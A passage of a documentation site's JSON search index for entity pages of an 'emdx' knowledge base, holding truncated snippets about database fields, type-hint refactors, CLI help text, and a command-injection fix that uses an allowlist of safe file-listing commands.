Any Type Removal Analysis [5/5]   Section: 1. <code>emdx/commands/delegate.py</code></p> </li> <li> <p>#6484 Any Type Removal Analysis [4/5]   Section: File: <code>emdx/services/unified_search.py</code></p> <p>Or more explicitly with TypedDict: ```python class FuzzyDoc(TypedDict):     id: int     title: str     project: str | None     created_at: str | None     updated_at: str | None</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...----|-------------| | Core Fields | | <code>id</code> | INTEGER | auto | Primary key | | <code>title</code> | TEXT | required | Task title | | <code>description</code> | TEXT | \"\" | Optional description | | <code>status</code> | TEXT | \"open\" | Current state: open, active, blocked, done, faile...</p> </li> <li> <p>#6410 Delegate: Research and design structured metadata for emdx save and de [2/2]   Section: Current State Analysis</p> <p>Existing document fields:</p> </li> <li><code>id</code>, <code>title</code>, <code>content</code>, <code>project</code> (core data)</li> <li><code>created_at</code>, <code>updated_at</code>, <code>accessed_at</code>, <code>access_count</code> (timestamps/tracking)</li> <li><code>is_deleted</code>, <code>deleted_at</code> (soft delete)</li> <li> <p>`pa...</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Medium Severity Issues (17)</p> <p>...nt_service.py<code>**Issue:** Document dicts lack structured types. Fields like</code>id<code>,</code>title<code>,</code>content<code>,</code>project<code>,</code>tags` should be defined in TypedDict Severity: MEDIUM (5 instances)</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>tasks table (migration 009):</p> </li> <li><code>id</code>: Primary key</li> <li><code>title</code>: Task title</li> <li><code>description</code>: Task description</li> <li><code>status</code>: open | active | blocked | done | failed</li> <li><code>priority</code>: 1-5 (default 3)</li> <li> <p><code>gameplan_id</code>: Links to documents...</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 1. Executions Table (<code>models/executions.py</code>)</p> <p>...ng execution ID | | <code>doc_id</code> | INTEGER | Optional document being executed | | <code>doc_title</code> | TEXT | Title for the execution | | <code>status</code> | TEXT | running/completed/failed | | <code>started_at</code> | TIMESTAMP | When execution began | | <code>completed_at</code> | TIMESTAMP |...</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Task Fields</p> <p>...-------|------|---------|-------------| | <code>id</code> | INTEGER | auto | Primary key | | <code>title</code> | TEXT | required | Task title | | <code>description</code> | TEXT | \"\" | Optional description | | <code>status</code> | TEXT | \"open\" | Current state | | <code>priority</code> | INTEGER | 3 | Prio...</p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: Subcommand Analysis</p> </li> <li> <p><code>title</code> (required): Task title</p> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]   Section: <code>emdx prime</code> \u2014 Session Context Injection</p> <p>...s with no blocking dependencies (uses <code>task_deps</code> table)</p> </li> <li>Fields shown: <code>id</code>, <code>title</code>, <code>description</code> (verbose only), <code>priority</code> (as P0-P4 label)</li> <li>Limit: Top 10, ordered by priority then created_at</li> <li> <p>**These are traditional \"to-do\" style tasks...</p> </li> <li> <p>#6154 Delegate: analysis [3/3]   Section: Database Schema Highlights</p> </li> <li><code>id</code>, <code>title</code>, <code>content</code>, <code>project</code></li> <li><code>parent_id</code>, <code>relationship</code> (for hierarchy)</li> <li><code>stage</code>, <code>pr_url</code> (cascade metadata)</li> <li><code>is_deleted</code>, <code>deleted_at</code> (soft delete)</li> <li> <p><code>access_count</code>, <code>accessed_at</code> (usage tracking)</p> </li> <li> <p>#6707 Delegate: Analyze the current Task screen (emdx/ui/task_view.py, task_ [2/4]   Section: How Tasks Are Grouped</p> <p>...status icon, colored</p> </li> <li>Epic (7 chars) \u2014 e.g., <code>TUI-3</code> in cyan, or blank</li> <li>Title \u2014 truncated to 45 chars, with the epic prefix stripped</li> <li> <p>Age (4 chars) \u2014 compact relative time like <code>2h</code>, <code>3d</code></p> </li> <li> <p>#6560 Delegate: Recent Failures in emdx prime   Section: <code>emdx/commands/prime.py</code></p> <p>...for status='failed' within the lookback window</p> </li> <li>Returns list of dicts with id, title, completed_at, exit_code, task_id, error_snippet</li> <li> <p>Extracts error snippets from log files</p> </li> <li> <p>#6559 Delegate: Document #6543 (Delegate Enhancement Gameplans [2/5]):</p> </li> </ul>"},{"location":"entities/title/#frontmatter","title":"Frontmatter","text":"<p>Six required fields: <code>id</code> (UUID), <code>title</code>, <code>desc</code>, <code>updated</code>, <code>created</code> \u2014 plus optional <code>config</code>, <code>tags</code>, <code>template</code>, <code>nav_order</code>, etc. Internal fields (<code>fname</code>, <code>parent</code>, <code>children</code>, <code>body</code>, <code>links</code>) are e...</p>"},{"location":"entities/title/#recommended","title":"Recommended","text":"<p>def _safe_create_task(     title: str,     prompt: str | None = None,     task_type: str = \"single\",     status: str = \"open\",     source_doc_id: int | None = None,     parent_task_id: int | None =...</p>"},{"location":"entities/title/#1-create-create-a-task","title":"1. <code>create</code> \u2014 Create a task","text":"<p>Arguments:</p>"},{"location":"entities/title/#documents-table","title":"Documents Table","text":""},{"location":"entities/title/#im","title":"Im","text":"<p>Section: PR Created</p> <p>Title: feat(delegate): Add --retry N flag with exponential backoff</p> <ul> <li>#6346 Delegate: PR #565 - Command Helpers Adoption [6/12]   Section: PR Created: Command Helpers Adoption </li> <li>PR: https://github.com/arockwell/emdx/pull/565</li> <li>Branch: feature/command-helpers</li> <li>Title: refactor(commands): Adopt command helpers to reduce code duplication (Issue #6330)</li> </ul>"},{"location":"entities/title/#pr-details","title":"PR Details","text":""},{"location":"entities/title/#related-entities","title":"Related Entities","text":"<ul> <li><code>fname</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.9)</li> <li><code>children</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.9)</li> <li><code>parent</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.9)</li> <li><code>desc</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.9)</li> <li><code>namespace: true</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>data.</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>create new</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>[0-9]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>vault/lang.python.basics.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> </ul>"},{"location":"entities/tokensused/","title":"tokens_used","text":"<p>Type: tech_term | Mentioned in: 15 documents | First seen: 2026-02-14</p>"},{"location":"entities/tokensused/#documents-15","title":"Documents (15)","text":"<ul> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...le) | FK to tasks table | | <code>cost_usd</code> | REAL DEFAULT 0.0 | Total cost in USD | | <code>tokens_used</code> | INTEGER DEFAULT 0 | Total token count | | <code>input_tokens</code> | INTEGER DEFAULT 0 | Input tokens | | <code>output_tokens</code> | INTEGER DEFAULT 0 | Output tokens | | `output_te...</p> </li> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> <p>...ict()<code>:</code>success<code>,</code>execution_id<code>,</code>log_file<code>,</code>output_doc_id<code>,</code>output_content<code>,</code>tokens_used<code>,</code>input_tokens<code>,</code>output_tokens<code>,</code>cost_usd<code>,</code>execution_time_ms<code>,</code>error_message<code>,</code>exit_code<code>,</code>cli_tool`</p> </li> <li> <p>#6604 Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dic   Section: Changes</p> <p>...), <code>log_file</code> (str), <code>output_doc_id</code> (int | None), <code>output_content</code> (str | None), <code>tokens_used</code> (int), <code>input_tokens</code> (int), <code>output_tokens</code> (int), <code>cost_usd</code> (float), <code>execution_time_ms</code> (int), <code>error_message</code> (str | None), <code>exit_code</code> (int | None), `cli_tool...</p> </li> <li> <p>#6577 Delegate: Audit emdx/services/ for functions that still return dict[str, Any] [1/3]   Section: 1. <code>unified_executor.py:192</code> \u2014 <code>ExecutionResult.to_dict()</code></p> <p>...fields (<code>success</code>, <code>execution_id</code>, <code>log_file</code>, <code>output_doc_id</code>, <code>output_content</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cost_usd</code>, <code>execution_time_ms</code>, <code>error_message</code>, <code>exit_code</code>, <code>cli_tool</code>). However, this is listed as an *intentional exception...</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <ul> <li><code>AgentExecutionDict</code>: Agent execution data used by <code>AgentExecutionItem</code> in the activity view. Fields include <code>id</code>, <code>doc_id</code>, <code>doc_title</code>, <code>status</code>, <code>started_at</code>, <code>completed_at</code>, <code>log_file</code>, <code>exit_code</code>, <code>working_dir</code>, <code>cost_usd</code>, <code>tokens_used</code>.</li> </ul> </li> <li> <p>#6499 Any Type Removal Analysis [5/5]   Section: 1. <code>emdx/commands/delegate.py</code></p> </li> <li> <p>#6466 Fix: Execution Dataclass Schema-Model Mismatch in EMDX   Section: Missing Fields Identified</p> </li> <li><code>task_id</code> - Links executions back to the creating task</li> <li><code>cost_usd</code> - Tracks API costs in USD</li> <li><code>tokens_used</code> - Total token usage count</li> <li><code>input_tokens</code> - Input token count</li> <li> <p><code>output_tokens</code> - Output token count</p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]   Section: Summary</p> <p>The <code>Execution</code> dataclass includes fields like <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cascade_run_id</code>, and <code>task_id</code>, but <code>get_execution()</code>, <code>get_recent_executions()</code>, <code>get_running_executions()</code>, and `get_stale_exec...</p> </li> <li> <p>#6277 Delegate: DEBT-2: Fix schema-model mismatch. The Execution dataclass i   Section: DEBT-2: Fix schema-model mismatch in Execution dataclass</p> <ol> <li>Migration 036 columns:</li> </ol> </li> <li><code>task_id</code> - Links execution to tasks</li> <li><code>cost_usd</code> - API cost tracking</li> <li><code>tokens_used</code> - Total token usage</li> <li><code>input_tokens</code> - Input token tracking</li> <li> <p><code>output_tokens</code> - Output token tracking</p> </li> <li> <p>#6268 Delegate: Document #6230 (Migration/Schema Debt Implementation)   Section: 1. Fixed Execution Dataclass (MEDIUM severity)</p> <p>...Links execution back to creating task</p> </li> <li><code>cost_usd</code>: Actual cost from Claude API</li> <li><code>tokens_used</code>: Total tokens consumed</li> <li><code>input_tokens</code>: Input tokens</li> <li> <p><code>output_tokens</code>: Output tokens</p> </li> <li> <p>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made</p> <p>...ution` dataclass:</p> </li> <li><code>cascade_run_id</code> (migration 031)</li> <li><code>task_id</code>, <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code> (migration 036)</li> <li><code>last_heartbeat</code> (migration 037)</li> <li> <p>Refactored all SELECT queries to use shared <code>_EXECUTION_COLUMNS</code> constant -...</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Critical Findings (Immediate Action Required)</p> <p>...ssing 6 columns from migrations 031/036: <code>cascade_run_id</code>, <code>task_id</code>, <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code></p> </li> <li> <p><code>last_heartbeat</code> column queries exist but column was dropped in migration 013</p> </li> <li> <p>#6228 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: 1. MEDIUM: Execution Dataclass Out of Sync with Schema**</p> <p>...tion back to creating task | | <code>cost_usd</code> | 036 | Actual cost from Claude API | | <code>tokens_used</code> | 036 | Total tokens consumed | | <code>input_tokens</code> | 036 | Input tokens | | <code>output_tokens</code> | 036 | Output tokens |</p> </li> </ul>"},{"location":"entities/tokensused/#recommended","title":"Recommended","text":"<p>def _safe_update_execution(exec_id: int | None, **kwargs: str | int | float | None) -&gt; None: <code>`` **Why:**</code>update_execution<code>accepts</code>doc_id<code>(int),</code>cost_usd<code>(float),</code>tokens_used` (int), etc. A union covers the actual value types.</p>"},{"location":"entities/tokensused/#from-migration-036","title":"From Migration 036","text":""},{"location":"entities/tokensused/#related-entities","title":"Related Entities","text":"<ul> <li><code>output_tokens</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (13 shared docs, PMI=5.8)</li> <li><code>input_tokens</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (13 shared docs, PMI=5.8)</li> <li><code>execution_time_ms</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.8)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>`emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>.types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>execution.is_zombie</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>task_id: optional[int] = none</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>task redo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>schema debt fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/trashpy/","title":"trash.py","text":"<p>Type: heading | Mentioned in: 13 documents | First seen: 2026-02-13</p>"},{"location":"entities/trashpy/#documents-13","title":"Documents (13)","text":"<ul> <li>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis </li> <li><code>days: int | None = typer.Option(None, ...)</code> - Legitimate: optional filter</li> <li> <p><code>identifiers: list[str] | None = typer.Argument(default=None, ...)</code> - **Legitimate...</p> </li> <li> <p>#6407 PR Evaluation: #567, #569, #572, #573, #575 vs mypy PR #588   Section: Detailed Analysis</p> <p>...actor</p> </li> <li>Files: 9 (introduces <code>_helpers.py</code>, refactors <code>browse.py</code>, <code>tags.py</code>, <code>trash.py</code>)</li> <li>Overlap: 3 files (<code>browse.py</code>, <code>tags.py</code>, <code>trash.py</code>)</li> <li> <p>Issue: These 3 command files were modified in #588 for mypy compliance. Rebasing would require re...</p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 1. Code Duplication</p> <p>...ines 141, 364, 581, 654, 772-773</p> </li> <li><code>tags.py</code>: lines 42, 153, 191, 237, 281, 334</li> <li><code>trash.py</code>: lines 56, 106, 165</li> <li><code>browse.py</code>: lines 30, 96, 145</li> <li> <p><code>groups.py</code>: lines 39, 84, 139, 189, 296, 372, 418</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 1: Architecture Issues (High Impact)</p> <p>...ervices layer | HIGH | <code>core.py</code>, <code>browse.py</code>, <code>gist.py</code>, <code>groups.py</code>, <code>tags.py</code>, <code>trash.py</code> import <code>database/</code> directly | | 2 layer violations | MEDIUM | <code>database/documents.py</code> imports from <code>models/tags</code> (upward); <code>utils/claude_wrapper.py</code> imports from `m...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...se.py`: list, recent, stats</p> </li> <li><code>tags.py</code>: tag add/remove/list/rename/merge/batch</li> <li><code>trash.py</code>: trash, restore, purge</li> <li><code>tasks.py</code>: agent work queue with dependencies</li> <li><code>groups.py</code>: hierarchical document organization</li> <li><code>prime.py</code>: session priming context</li> <li> <p>`s...</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: Violations by Category</p> <p>...ces/analysis_service.py<code>| |</code>status.py<code>| 50+ |</code>services/status_service.py<code>| |</code>trash.py<code>| Clean \u2713 | \u2014 | |</code>tasks.py` | Clean \u2713 | \u2014 |</p> </li> <li> <p>#6279 Delegate: DEBT-8: Standardize CLI interfaces. Standardize doc_id param   Section: 1. Added Help Text to Typer Apps (9 files)</p> <p>...|------|-----------------| | <code>core.py</code> | \"Core CRUD operations for documents\" | | <code>trash.py</code> | \"Manage deleted documents (trash)\" | | <code>browse.py</code> | \"Browse and list documents with statistics\" | | <code>gist.py</code> | \"GitHub Gist integration\" | | <code>executions.py</code> | \"...</p> </li> <li> <p>#6264 Delegate: API/Interface Debt Fix - Help Text and Silent Failures   Section: 1. Added Help Text to 5 Typer Apps (Missing Documentation)</p> <p>...e executions\" | | <code>gist.py</code> | \"GitHub Gist integration for sharing documents\" | | <code>trash.py</code> | \"Manage deleted documents (trash)\" |</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...| \u274c NO | | <code>tags.py</code> | \u2705 YES (<code>test_commands_tags.py</code>) | | <code>tasks.py</code> | \u274c NO | | <code>trash.py</code> | \u274c NO |</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...y**: All necessary</p> </li> <li>ask.py: All necessary</li> <li>analyze.py: All necessary</li> <li>trash.py: All necessary</li> <li>review.py: All necessary</li> <li>prime.py: All necessary</li> <li>categories.py: All necessary</li> <li>browse.py: All necessary</li> <li> <p>briefing.py: 1...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...tegories.py | 97 | THIN - Category management. Just wraps task system. | | trash.py | 205 | SUPPORT - Trash management. Necessary but simple. | | ask.py | 330 | UNCLEAR** - AI-assisted search. Relies on ask_service: 364 LOC. Value unclea...</p> </li> <li> <p>#6346 Delegate: PR #565 - Command Helpers Adoption [6/12]   Section: Changes Made</p> </li> <li>trash.py: Removed ~40 lines of boilerplate by using <code>@combined_decorator</code></li> <li>tags.py: Removed ~50 lines by using <code>@combined_decorator</code> and <code>require_document()</code></li> <li> <p>**bro...</p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]   Section: Changes Made</p> </li> <li>trash.py: \"Manage deleted documents (trash, restore, purge)\"</li> <li>executions.py: \"Monitor and manage execution processes\"</li> <li>gist.py: \"Create and manage GitHub gists fr...</li> </ul>"},{"location":"entities/trashpy/#trashpy_1","title":"trash.py","text":""},{"location":"entities/trashpy/#refactored-files","title":"Refactored Files","text":""},{"location":"entities/trashpy/#1-added-help-text-to-typer-apps-issue-8","title":"1. Added Help Text to Typer Apps (Issue #8)","text":""},{"location":"entities/trashpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.0)</li> <li><code>typer apps</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>help text</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>added help text</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>services/analysis_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>gist.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=5.9)</li> <li><code>browse.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (12 shared docs, PMI=5.8)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.5)</li> <li><code>recipe.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.3)</li> </ul>"},{"location":"entities/tree/","title":"tree","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-14</p>"},{"location":"entities/tree/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Git Integration Options</p> Flag Short Description <code>--worktree</code> <code>-w</code> Run in isolated git worktree <code>--pr</code> \u2014 Create a PR after changes (implies <code>--worktree</code>) <code>--branch</code> \u2014 Push branch without creating PR (implie... </li> <li> <p>#6465 Security Audit and Fixes: EMDX Command Injection Vulnerability   Section: 1. Command Allowlist</p> <p>Only safe file-discovery commands are permitted:</p> </li> <li> <p><code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>rg</code>, <code>grep</code>, <code>eza</code>, <code>exa</code>, <code>tree</code>, <code>locate</code>, <code>ag</code>, <code>mdfind</code></p> </li> <li> <p>#6353 Delegate: Analyze upgrading textual from ^4.0.0 to ^6.2.1 for the emdx [2/2]   Section: 3.3 Performance Improvements</p> <p>Multiple releases include rendering optimizations that should improve our TUI responsiveness, especially in:</p> </li> <li>Large document lists</li> <li>Log streaming</li> <li> <p>Activity tree updates</p> </li> <li> <p>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands   Section: emdx/commands/delegate.py</p> <ol> <li>Added <code>SAFE_DISCOVERY_COMMANDS</code> allowlist containing safe file discovery commands:</li> </ol> </li> <li> <p><code>fd</code>, <code>find</code>, <code>ls</code>, <code>eza</code>, <code>exa</code>, <code>rg</code>, <code>git</code>, <code>locate</code>, <code>tree</code>, <code>echo</code>, <code>cat</code>, <code>head</code>, <code>tail</code>, <code>seq</code></p> </li> <li> <p>#6263 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [28/37]   Section: 1. Command Injection Fix (emdx/commands/delegate.py)</p> <p>...nes an allowlist of safe commands: <code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>rg</code>, <code>exa</code>, <code>eza</code>, <code>tree</code></p> </li> <li>Rejects dangerous shell metacharacters before parsing: <code>;</code>, <code>|</code>, <code>&amp;</code>, backticks, <code>$()</code></li> <li>Uses <code>shlex.split()</code> to properly parse the command</li> <li> <p>Verifies the base co...</p> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> </li> <li>Allowlist validation: Only safe discovery commands are permitted:</li> <li> <p><code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>eza</code>, <code>rg</code>, <code>grep</code>, <code>ag</code>, <code>tree</code></p> </li> <li> <p>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37]   Section: Summary</p> </li> <li>Command allowlist: Only safe file-listing commands are permitted:</li> <li> <p><code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>rg</code>, <code>grep</code>, <code>eza</code>, <code>exa</code>, <code>tree</code>, <code>locate</code></p> </li> <li> <p>#6245 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [2/37]   Section: Fix Implementation</p> </li> <li> <p><code>fd</code>, <code>find</code>, <code>git</code>, <code>ls</code>, <code>rg</code>, <code>eza</code>, <code>tree</code>, <code>locate</code>, <code>fdfind</code>, <code>exa</code></p> </li> <li> <p>#6243 Delegate: Fix command injection in --each flag   Section: The Fix</p> <ol> <li>Added command allowlist - Only safe file-discovery commands are permitted:</li> </ol> </li> <li> <p><code>fd</code>, <code>find</code>, <code>ls</code>, <code>git</code>, <code>rg</code>, <code>eza</code>, <code>exa</code>, <code>tree</code></p> </li> <li> <p>#6240 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [4/37]   Section: Fix Applied</p> </li> <li><code>fd</code>, <code>find</code>, <code>git</code>, <code>rg</code>, <code>ls</code>, <code>eza</code>, <code>exa</code>, <code>tree</code>, <code>locate</code>, <code>mdfind</code></li> </ul>"},{"location":"entities/tree/#the-fix","title":"The Fix","text":""},{"location":"entities/tree/#the-fix_1","title":"The Fix","text":""},{"location":"entities/tree/#1-command-allowlist","title":"1. Command Allowlist","text":"<p>Only these known-safe file-discovery commands are permitted:</p>"},{"location":"entities/tree/#1-command-allowlist-_safe_discovery_commands","title":"1. Command Allowlist (<code>_SAFE_DISCOVERY_COMMANDS</code>)","text":"<p>Only permits known file-listing tools:</p>"},{"location":"entities/tree/#related-entities","title":"Related Entities","text":"<ul> <li><code>locate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.4)</li> <li><code>shell metacharacter blocking</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>mdfind</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>allowlist validation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>2. shell metacharacter blocking</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>echo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>command allowlist only</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>bash</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>security fix: command injection in delegate --each</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.4)</li> <li><code>critical command injection vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/typechecking/","title":"type_checking","text":"<p>Type: tech_term | Mentioned in: 16 documents | First seen: 2026-02-13</p>"},{"location":"entities/typechecking/#documents-16","title":"Documents (16)","text":"<ul> <li>#6583 Delegate synthesis [synthesis]   Section: Production Code (<code>services/</code> + <code>ui/</code>) <p>...<code>ui/</code> across 14 files</p> </li> <li>Most fixes are mechanical: add <code>TypedDict</code> definitions or <code>TYPE_CHECKING</code> guards</li> <li> <p>Textual widget <code>*args: Any, **kwargs: Any</code> and 